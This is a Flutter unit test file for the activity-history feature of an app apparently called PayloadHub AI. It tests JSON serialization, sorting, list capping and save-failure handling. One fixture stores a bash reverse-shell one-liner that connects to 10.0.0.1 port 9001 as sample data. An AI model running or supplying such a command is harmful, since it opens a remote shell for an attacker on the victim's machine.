import 'package:flutter_test/flutter_test.dart';
import 'package:payloadhub_ai/features/history/data/activity_repository.dart';
import 'package:payloadhub_ai/features/history/domain/activity_entry.dart';
import 'package:payloadhub_ai/features/history/presentation/history_controller.dart';

/// In-memory repository used to test controller behaviour without plugins.
class _MemoryRepository implements ActivityRepository {
  List<ActivityEntry> stored = <ActivityEntry>[];
  int saveCount = 0;
  bool failNextSave = false;

  @override
  Future<List<ActivityEntry>> load() async => List.of(stored);

  @override
  Future<void> save(List<ActivityEntry> entries) async {
    saveCount++;
    if (failNextSave) {
      failNextSave = false;
      throw StateError('disk full');
    }
    stored = List.of(entries);
  }
}

void main() {
  group('ActivityEntry serialization', () {
    test('round-trips through JSON', () {
      final entry = ActivityEntry.create(
        kind: ActivityKind.payload,
        title: 'Reverse Shell · bash',
        detail: 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1',
        createdAt: DateTime.utc(2026, 10, 20, 13, 45),
      );
      final parsed = ActivityEntry.tryFromJson(entry.toJson());
      expect(parsed, isNotNull);
      expect(parsed!.id, entry.id);
      expect(parsed.kind, ActivityKind.payload);
      expect(parsed.title, entry.title);
      expect(parsed.detail, entry.detail);
      expect(parsed.createdAt, entry.createdAt);
    });

    test('rejects malformed records instead of throwing', () {
      expect(ActivityEntry.tryFromJson(null), isNull);
      expect(ActivityEntry.tryFromJson('nope'), isNull);
      expect(
        ActivityEntry.tryFromJson(<String, dynamic>{'id': 'x'}),
        isNull,
      );
      expect(
        ActivityEntry.tryFromJson(<String, dynamic>{
          'id': 'x',
          'title': 't',
          'detail': 'd',
          'createdAt': 'not-a-date',
        }),
        isNull,
      );
    });

    test('unknown kind falls back to payload', () {
      final parsed = ActivityEntry.tryFromJson(<String, dynamic>{
        'id': 'x',
        'kind': 'future-kind',
        'title': 't',
        'detail': 'd',
        'createdAt': '2026-10-20T13:45:00.000Z',
      });
      expect(parsed!.kind, ActivityKind.payload);
    });
  });

  group('HistoryController', () {
    test('loads persisted entries and sorts newest first', () async {
      final repository = _MemoryRepository()
        ..stored = [
          ActivityEntry.create(
            kind: ActivityKind.scan,
            title: 'older',
            detail: 'a',
            createdAt: DateTime(2026, 1, 1),
          ),
          ActivityEntry.create(
            kind: ActivityKind.payload,
            title: 'newer',
            detail: 'b',
            createdAt: DateTime(2026, 2, 1),
          ),
        ];
      final controller = HistoryController(repository);
      await Future<void>.delayed(Duration.zero);
      expect(controller.state.loading, isFalse);
      expect(controller.state.entries.length, 2);
      expect(controller.state.entries.first.title, 'newer');
    });

    test('adds, persists, removes and clears', () async {
      final repository = _MemoryRepository();
      final controller = HistoryController(repository);
      await Future<void>.delayed(Duration.zero);

      await controller.add(ActivityEntry.create(
        kind: ActivityKind.payload,
        title: 'first',
        detail: 'payload-1',
      ));
      await controller.add(ActivityEntry.create(
        kind: ActivityKind.threat,
        title: 'second',
        detail: 'hash',
      ));

      expect(controller.state.entries.length, 2);
      expect(controller.state.entries.first.title, 'second');
      expect(repository.stored.length, 2);

      await controller.remove(controller.state.entries.first.id);
      expect(controller.state.entries.length, 1);
      expect(controller.state.entries.first.title, 'first');
      expect(repository.stored.length, 1);

      await controller.clear();
      expect(controller.state.entries, isEmpty);
      expect(repository.stored, isEmpty);
    });

    test('caps the list at maxEntries', () async {
      final repository = _MemoryRepository();
      final controller = HistoryController(repository);
      await Future<void>.delayed(Duration.zero);

      for (var i = 0; i < HistoryController.maxEntries + 5; i++) {
        await controller.add(ActivityEntry.create(
          kind: ActivityKind.payload,
          title: 'entry-$i',
          detail: 'detail',
          createdAt: DateTime(2026, 1, 1).add(Duration(minutes: i)),
        ));
      }

      expect(controller.state.entries.length, HistoryController.maxEntries);
      expect(controller.state.entries.first.title, 'entry-44');
      expect(repository.stored.length, HistoryController.maxEntries);
    });

    test('surfaces persistence failures without losing memory state', () async {
      final repository = _MemoryRepository()..failNextSave = true;
      final controller = HistoryController(repository);
      await Future<void>.delayed(Duration.zero);

      await controller.add(ActivityEntry.create(
        kind: ActivityKind.payload,
        title: 'kept in memory',
        detail: 'x',
      ));

      expect(controller.state.entries.length, 1);
      expect(controller.state.error, contains('Gagal menyimpan riwayat'));
    });
  });
}
